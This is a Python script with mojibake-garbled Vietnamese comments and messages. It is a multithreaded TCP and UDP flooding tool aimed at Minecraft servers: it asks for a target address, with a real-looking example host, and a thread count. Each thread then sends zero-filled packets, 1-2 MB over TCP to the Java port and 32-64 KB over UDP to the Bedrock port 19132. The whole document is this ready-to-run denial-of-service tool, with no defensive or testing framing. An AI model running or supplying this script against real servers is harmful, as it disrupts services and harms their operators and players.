import socket
import threading
import random

# H√†m g·ª≠i g√≥i tin TCP
def send_tcp_packet(server_ip, server_port, packet_count, thread_id):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((server_ip, server_port))
            for _ in range(packet_count):
                packet_size = random.randint(1024 * 1024, 2 * 1024 * 1024)  # 1MB - 2MB
                packet = b"\x00" * packet_size
                s.sendall(packet)
                print(f"üöÄ [TCP] Lu·ªìng {thread_id}: G·ª≠i {packet_size / (1024 * 1024):.2f} MB")
    except Exception as e:
        print(f"‚ö†Ô∏è [TCP] L·ªói ·ªü lu·ªìng {thread_id}: {e}")

# H√†m g·ª≠i g√≥i tin UDP (Gi·ªõi h·∫°n 32KB - 64KB)
def send_udp_packet(server_ip, server_port, packet_count, thread_id):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            for _ in range(packet_count):
                packet_size = random.randint(32 * 1024, 64 * 1024)  # 32KB - 64KB
                packet = b"\x00" * packet_size
                s.sendto(packet, (server_ip, server_port))
                print(f"üî• [UDP] Lu·ªìng {thread_id}: G·ª≠i {packet_size / 1024:.2f} KB")
    except Exception as e:
        print(f"‚ö†Ô∏è [UDP] L·ªói ·ªü lu·ªìng {thread_id}: {e}")

# Nh·∫≠p ƒë·ªãa ch·ªâ server
server_address = input("Nh·∫≠p ƒë·ªãa ch·ªâ server (v√≠ d·ª•: mbasic5.pikamc.vn:25083): ")

# Ki·ªÉm tra xem c√≥ nh·∫≠p c·ªïng kh√¥ng
if ":" in server_address:
    server_ip, server_port = server_address.split(":")
    server_port = int(server_port)
else:
    server_ip = server_address
    server_port = 25565  # M·∫∑c ƒë·ªãnh cho Minecraft Java

udp_port = 19132  # M·∫∑c ƒë·ªãnh cho Minecraft Bedrock

# S·ªë lu·ªìng mu·ªën s·ª≠ d·ª•ng
thread_count = int(input("Nh·∫≠p s·ªë l∆∞·ª£ng lu·ªìng: "))

# S·ªë g√≥i tin m·ªói lu·ªìng g·ª≠i
tcp_packet_count = 10  # 10 g√≥i TCP (1MB - 2MB m·ªói g√≥i)
udp_packet_count = 100  # 100 g√≥i UDP (32KB - 64KB m·ªói g√≥i)

# T·∫°o & ch·∫°y nhi·ªÅu lu·ªìng g·ª≠i TCP v√† UDP
threads = []
for i in range(thread_count):
    thread_tcp = threading.Thread(target=send_tcp_packet, args=(server_ip, server_port, tcp_packet_count, i+1))
    thread_udp = threading.Thread(target=send_udp_packet, args=(server_ip, udp_port, udp_packet_count, i+1))

    threads.append(thread_tcp)
    threads.append(thread_udp)

    thread_tcp.start()
    thread_udp.start()

# ƒê·ª£i t·∫•t c·∫£ c√°c lu·ªìng ho√†n th√†nh
for thread in threads:
    thread.join()

print("‚úÖ Ho√†n t·∫•t g·ª≠i g√≥i tin TCP & UDP.")
